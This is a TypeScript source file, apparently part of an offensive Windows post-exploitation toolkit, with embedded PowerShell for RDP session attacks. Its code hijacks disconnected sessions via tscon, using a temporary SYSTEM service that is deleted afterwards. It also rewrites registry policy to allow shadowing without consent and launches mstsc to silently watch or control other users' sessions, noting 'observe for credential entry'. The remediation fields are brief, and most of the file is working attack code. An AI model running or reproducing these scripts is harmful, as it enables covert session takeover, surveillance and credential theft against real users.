$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
Write-Output ""
Write-Output "[*] Running as SYSTEM: $isSystem"
if (-not $isSystem) {
    Write-Output "    [!] SYSTEM required for credential-less hijack — use token_impersonate or potato_attack first"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const discMatch = result.stdout.match(/Disconnected sessions.*?:\s*(\d+)/)
    const discCount = discMatch ? parseInt(discMatch[1]) : 0
    if (discCount > 0) {
      findings.push({
        checkId: "WIN-RDP-001",
        provider: "windows",
        severity: "high",
        status: "ENUMERATED",
        resource: "rdp://sessions",
        title: `${discCount} disconnected RDP sessions available for hijacking`,
        details: "Disconnected RDP sessions can be hijacked as SYSTEM without credentials using tscon.exe",
        remediation: "Set GPO to log off disconnected sessions after timeout. Disable Remote Desktop if not needed.",
      })
    }
  } else {
    if (!sessionId) return { output: "[!] Required: --session SESSION_ID", findings }

    const script = `
# Check if SYSTEM
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
if (-not $isSystem) {
    Write-Output "[!] Not running as SYSTEM — attempting service-based tscon execution"
    # Create a temporary service to run tscon as SYSTEM
    $svcName = "csRdpHijack"
    $binPath = "cmd.exe /c tscon ${sessionId} /dest:console"
    Write-Output "[*] Creating service '$svcName'..."
    sc.exe create $svcName binPath= $binPath start= demand type= own error= ignore 2>&1 | Out-Null
    Write-Output "[*] Starting service..."
    sc.exe start $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    sc.exe delete $svcName 2>&1 | Out-Null
    Write-Output "[+] Service executed and cleaned up"
} else {
    Write-Output "[*] Running as SYSTEM — executing tscon directly"
    $result = tscon ${sessionId} /dest:console 2>&1
    Write-Output $result
}

Write-Output ""
Write-Output "[+] Session ${sessionId} hijack attempted"
Write-Output "[*] Current sessions after hijack:"
query user 2>&1
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-RDP-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `rdp://session/${sessionId}`,
      title: `RDP session ${sessionId} hijacked`,
      details: "Session taken over via tscon.exe executed as SYSTEM",
      remediation: "Monitor Event ID 4778 (session reconnected). Set logoff timeout for disconnected sessions.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function rdpShadow(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const sessionId = argVal(args, "--session-id")
  const noConsent = hasFlag(args, "--no-consent")
  const control = hasFlag(args, "--control")
  const findings: Finding[] = []
  const output: string[] = ["[*] RDP session shadowing operations...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== Active RDP Sessions ==="
Write-Output ""

# query user shows all sessions
$sessions = query user 2>&1
Write-Output $sessions
Write-Output ""

# Parse session details
$activeCount = 0
$lines = $sessions -split [char]10 | Select-Object -Skip 1
foreach ($line in $lines) {
  if ($line -match '^\s*(\S+)\s+(\S+)\s+(\d+)\s+(Active|Disc)\s') {
    $user = $Matches[1]
    $sess = $Matches[2]
    $id = $Matches[3]
    $state = $Matches[4]
    if ($state -eq 'Active') { $activeCount++ }
  }
}
Write-Output "ACTIVE_COUNT=$activeCount"

# Check shadow permissions
Write-Output ""
Write-Output "=== Shadow Configuration ==="

# GPO: AllowRemoteRPC
$rpc = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name AllowRemoteRPC -ErrorAction SilentlyContinue).AllowRemoteRPC
Write-Output "AllowRemoteRPC: $(if ($rpc -eq 1) { 'ENABLED (remote shadow possible)' } else { 'DISABLED (local shadow only)' })"
Write-Output "REMOTE_RPC=$rpc"

# Shadow mode policy
$shadow = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -ErrorAction SilentlyContinue).Shadow
$shadowModes = @{
  0 = 'Disabled'
  1 = 'Full Control with user permission'
  2 = 'Full Control without user permission'
  3 = 'View Only with user permission'
  4 = 'View Only without user permission'
}
$shadowMode = if ($shadow -ne $null) { $shadowModes[$shadow] } else { 'Not configured (default: Full Control with permission)' }
Write-Output "Shadow Policy: $shadowMode"
Write-Output "SHADOW_MODE=$shadow"

# Check if current user can shadow
Write-Output ""
Write-Output "=== Current User Privileges ==="
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Output "Is Admin: $isAdmin"

$groups = whoami /groups /fo csv 2>&1 | ConvertFrom-Csv
$rdpUsers = $groups | Where-Object { $_.'Group Name' -match 'Remote Desktop Users' }
Write-Output "Remote Desktop Users: $(if ($rdpUsers) { 'YES' } else { 'NO' })"
Write-Output "CAN_SHADOW=$(if ($isAdmin) { '1' } else { '0' })"

# NLA (Network Level Authentication) status
$nla = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -ErrorAction SilentlyContinue).UserAuthentication
Write-Output ""
Write-Output "NLA Required: $(if ($nla -eq 1) { 'YES' } else { 'NO' })"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const activeCount = r.stdout.match(/ACTIVE_COUNT=(\d+)/)
    const shadowMode = r.stdout.match(/SHADOW_MODE=(\d*)/)
    const canShadow = r.stdout.includes("CAN_SHADOW=1")

    if (activeCount && parseInt(activeCount[1]) > 0 && canShadow) {
      findings.push({
        checkId: "WIN-RDP-001",
        provider: "windows",
        severity: "high",
        status: "SHADOWABLE",
        resource: "rdp://sessions",
        title: `${activeCount[1]} active RDP sessions available for shadowing`,
        details: `Active sessions can be shadowed for real-time credential observation. Shadow mode: ${shadowMode ? shadowMode[1] : "default"}. Use --action shadow --session-id ID to start.`,
        remediation: "Set GPO 'Set rules for remote control of RDS sessions' to Disabled.",
      })
    }

    if (shadowMode && (shadowMode[1] === "2" || shadowMode[1] === "4")) {
      findings.push({
        checkId: "WIN-RDP-002",
        provider: "windows",
        severity: "critical",
        status: "NO_CONSENT",
        resource: "rdp://shadow-policy",
        title: "RDP shadow allowed WITHOUT user consent",
        details:
          "Shadow policy permits shadowing active sessions without the user seeing a consent prompt. This enables completely silent session observation.",
        remediation: "Set shadow policy to require user permission (mode 1 or 3).",
      })
    }
  }

  if (action === "shadow") {
    if (!sessionId) {
      output.push("ERROR: --session-id required (use --action enum to list sessions)")
      return { output: output.join("\n"), findings }
    }

    const shadowFlag = control ? "/control" : ""
    const consentFlag = noConsent ? "/noConsentPrompt" : ""

    const script = `
Write-Output "=== Starting RDP Shadow ==="
Write-Output "Session ID: ${sessionId}"
Write-Output "Mode: $(if ('${control}' -eq 'true') { 'Full Control (interactive)' } else { 'View Only (passive)' })"
Write-Output "Consent: $(if ('${noConsent}' -eq 'true') { 'DISABLED (silent)' } else { 'User will see consent prompt' })"
Write-Output ""

# Verify session exists and is active
$session = query session ${sessionId} 2>&1
Write-Output $session
Write-Output ""

# Check shadow policy allows no-consent if requested
${
  noConsent
    ? `
$shadowPolicy = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -ErrorAction SilentlyContinue).Shadow
if ($shadowPolicy -ne 2 -and $shadowPolicy -ne 4) {
  Write-Output "[!] WARNING: Shadow policy may require user consent"
  Write-Output "    Set registry to allow no-consent shadow:"
  Write-Output "    reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f"
  Write-Output ""
}
`
    : ""
}

# Configure shadow settings for no-consent if needed
${
  noConsent
    ? `
Write-Output "[*] Configuring no-consent shadow..."
Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
Write-Output "[+] Shadow policy set to: Full Control without consent"
Write-Output "POLICY_SET=1"
Write-Output ""
`
    : ""
}

# Start shadow session
Write-Output "[*] Launching shadow session..."
Write-Output "[*] Command: mstsc /shadow:${sessionId} ${shadowFlag} ${consentFlag}"
Write-Output ""
Write-Output "[*] Press Ctrl+* to disconnect from shadow session"
Write-Output ""

# Start mstsc shadow in background
Start-Process mstsc -ArgumentList "/shadow:${sessionId} ${shadowFlag} ${consentFlag}" -WindowStyle Normal
Write-Output "[+] Shadow session launched"
Write-Output "SHADOW_STATUS=STARTED"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("SHADOW_STATUS=STARTED")) {
      findings.push({
        checkId: "WIN-RDP-010",
        provider: "windows",
        severity: "critical",
        status: "SHADOWING",
        resource: `rdp://session/${sessionId}`,
        title: `RDP session ${sessionId} is being shadowed`,
        details: `${control ? "Full control" : "View only"} shadow active. ${noConsent ? "No user consent prompt." : "User may see consent dialog."} Observe for credential entry.`,
        remediation: "Disconnect shadow with Ctrl+*. Restore policy if modified.",
      })
    }
  }

  if (action === "config") {
    const script = `
Write-Output "=== RDP Shadow Configuration ==="
Write-Output ""

# Enable remote shadow (AllowRemoteRPC)
Write-Output "[*] Enabling remote shadow capability..."
Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name AllowRemoteRPC -Value 1 -Type DWord -Force
Write-Output "[+] AllowRemoteRPC = 1 (remote shadow enabled)"

# Set shadow policy to no-consent
Write-Output "[*] Setting shadow policy to no-consent..."
Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -Value 2 -Type DWord -Force
Write-Output "[+] Shadow = 2 (Full Control without user permission)"

Write-Output ""
Write-Output "[+] Configuration complete"
Write-Output "[*] Now use: winhook rdp_shadow --action shadow --session-id ID --control --no-consent"
Write-Output ""
Write-Output "[!] Cleanup: Restore shadow policy"
Write-Output "    reg delete 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /f"
Write-Output "    reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v AllowRemoteRPC /t REG_DWORD /d 0 /f"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}
